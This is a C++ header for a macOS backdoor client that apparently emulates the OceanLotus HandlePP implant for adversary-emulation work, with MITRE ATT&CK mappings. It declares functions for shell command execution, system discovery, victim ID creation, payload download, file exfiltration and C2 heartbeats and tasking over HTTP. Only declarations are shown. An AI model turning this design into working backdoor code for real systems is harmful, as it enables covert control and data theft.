#ifndef ClientPP_hpp
#define ClientPP_hpp

#include <chrono>
#include <fstream>
#include <iostream>
#include <sstream>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <cstdio>
#include <thread>
#include <dlfcn.h>
#include <pwd.h>

#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOKitLib.h>
#include <SystemConfiguration/SystemConfiguration.h>

#include "Communication.hpp"
#include "Transform.hpp"
#include "no_strings.hpp"

namespace client {
    extern const int RESP_BUFFER_SIZE;
    extern const std::string DOWNLOAD_FILE_NAME;

    /*
    executeCmd
        About:
            Helper function to execute a command on the system using the popen
            API
        Result:
            std::string - output of the command
        MITRE ATT&CK Techniques:
            T1059.004 Command and Scripting Interpreter: Unix Shell
    */
    std::string executeCmd(std::string cmd);

    /*
    getPlatformExpertDeviceValue
        About:
            Helper function to enumerate values from the IOPlatformExpertDevice
            registry class containing information about device configuration by
            leveraging the following API calls from IOKit:
                - IOServiceGetMatchingService
                - IOServiceMatching
                - IORegistryEntryCreateCFProperty
                - IOObjectRelease
        Result:
            std::string - value of the provided registry key
        MITRE ATT&CK Techniques:
            T1082 System Information Discovery
    */
    std::string getPlatformExpertDeviceValue(std::string key);

    /*
    getComputerName
        About:
            Helper function to get computer name using SCDynamicStoreCopyComputerName
            API from SystemConfiguration framework
        Result:
            std::string - representing computer name
        MITRE ATT&CK Techniques:
            T1082 System Information Discovery
    */
    std::string getComputerName();

    /*
    getHardwareName
        About:
            Helper function to get the hardware name using uname API from utsname.h
        Result:
            std::string - representing hardware name
        MITRE ATT&CK Techniques:
            T1082 System Information Discovery
    */
    std::string getHardwareName();

    /*
    writeFile
        About:
            Helper function write payload bytes to the given path
        Result:
            boolean - true if write was successful, false otherwise
        MITRE ATT&CK Techniques:
            T1105 Ingress Tool Transfer
    */
    bool writeFile(std::vector<unsigned char> payload, std::string path);

    /*
    readFile
        About:
            Helper function to read file bytes from the given path
        Result:
            vector<unsigned char> - file bytes
        MITRE ATT&CK Techniques:
            T1041 Exfiltration Over C2 Channel
    */
   std::vector<unsigned char> readFile(std::string path);

   /*
   getFileSize
        About:
            Helper function to get the file size from the given path
        Result:
            int - file size represented in bytes
   */
  int getFileSize(std::string path);
}

class ClientPP
{
public:
    /*
    Variables modeled after HandlePP class - https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html
    May end up removing some if unneeded
    */
    std::string pathProcess;
    uint8_t     clientID[24];
    std::string strClientID;
    int64_t     installTime;
    // void        *urlRequest;
    // int8_t      keyDecrypt[24];
    // int64_t     timeCheckRequestTimeout;
    // int         posDomain;
    std::string domain;
    // int         count;

    void *      dylib;

    /*
    osInfo
        About:
            Modeled after HandlePP::infoClient function. Responsible for collecting
            OS information, creating the clientID, and submitting to the C2 server:
                - perform OS discovery
                - create clientID
                - send collected information to C2 server via HTTP POST request
        Result:
            boolean - true if already executed or executed successfully, false
                    otherwise
        MITRE ATT&CK Techniques:
            T1082 System Information Discovery
            T1016 System Network Configuration Discovery
            T1124 System Time Discovery
            T1071.001 Application Layer Protocol: Web Protocols
        CTI:
            https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html
            https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html
            https://www.welivesecurity.com/2019/04/09/oceanlotus-macos-malware-update/
        References:
            https://pubs.opengroup.org/onlinepubs/009604499/functions/getpwuid.html
    */
    static bool osInfo(int dwRandomTimeSleep, ClientPP * c);

    /*
    runClient
        About:
            Modeled after HandlePP::runHandle function. Responsible for performing
            backdoor capabilities:
                - sends heartbeat to C2 server via HTTP GET request
                - performs data transformations
                - executes received instructions
                - sends output to C2 server via HTTP POST request
        Result:
            void - no return value, just performs backdoor capabilities
        MITRE ATT&CK Techniques:
            T1071.001 Application Layer Protocol: Web Protocols
            T1105 Ingress Tool Transfer
            T1059.004 Command and Scripting Interpreter: Unix Shell
        CTI:
            https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html
            https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html
        References:
    */
    static void runClient(int dwRandomTimeSleep, ClientPP * c, void * dylib);

    /*
    createClientID
        About:
            Modeled after HandlePP::getClientID method. Responsible for generating
            an MD5 hash from the following pieces of information:
                - OS serial number
                - Hardware UUID
                - MAC address
                - Randomly generated UUID
        Result:
            clientID updated for the provided ClientPP
        MITRE ATT&CK Techniques:
            T1082 System Information Discovery
            T1016 System Network Configuration Discovery
        CTI:
            https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html
        References:
            https://stackoverflow.com/a/54696457
    */
    static void createClientID(ClientPP * c);

    /*
    performHTTPRequest
        About:
            Modeled after HandlePP::requestServer method. Responsible for
            calling the loaded CommsLib exported function to generate an HTTP
            request (GET/POST).
        Result:
            vector of unsigned char - holds the HTTP request responses
        MITRE ATT&CK Techniques:
            T1071.001 Application Layer Protocol: Web Protocols
        CTI:
            https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html
            https://www.welivesecurity.com/2019/04/09/oceanlotus-macos-malware-update/
        References:
    */
    static void performHTTPRequest(void* dylib, std::string type, std::vector<unsigned char> data, unsigned char * instruction, std::string clientID, unsigned char* response_buffer_ptr, int* response_length_ptr);

    ~ClientPP();

};


#endif /* ClientPP_hpp */
